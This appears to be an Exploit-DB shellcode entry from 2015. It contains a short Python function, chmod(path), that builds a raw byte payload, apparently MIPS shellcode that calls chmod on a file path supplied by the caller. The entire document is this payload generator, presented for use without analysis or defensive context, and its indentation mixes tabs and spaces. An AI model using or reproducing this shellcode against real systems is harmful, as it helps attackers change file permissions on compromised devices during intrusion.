#https://www.exploit-db.com/exploits/36276/
#Date: 2015-03-05
#Author: Sang-Min LEE
#Email: leesangmin144@gmail.com
#Blog: http://smleenull.tistory.com

def chmod( path):
        shellcode =   r"\xff\xff\x06"
	shellcode +=  r"\x28\xff\xff"
	shellcode +=  r"\xd0\x04\xff"
	shellcode +=  r"\xff\x05\x28"
	shellcode +=  r"\xb6\x01\x05"
	shellcode +=  r"\x24\x01\x10"
	shellcode +=  r"\xe4\x27\x1f"
	shellcode +=  r"\xf0\x84\x24"
	shellcode +=  r"\xaf\x0f\x02"
	shellcode +=  r"\x24\x0c\x01"
	shellcode +=  r"\x01\x01\xff"
	shellcode +=  r"\xff\x04\x28"
	shellcode +=  r"\xa1\x0f\x02"
	shellcode +=  r"\x24\x0c\x01"
	shellcode +=  r"\x01\x01"
        shellcode += path
        return shellcode

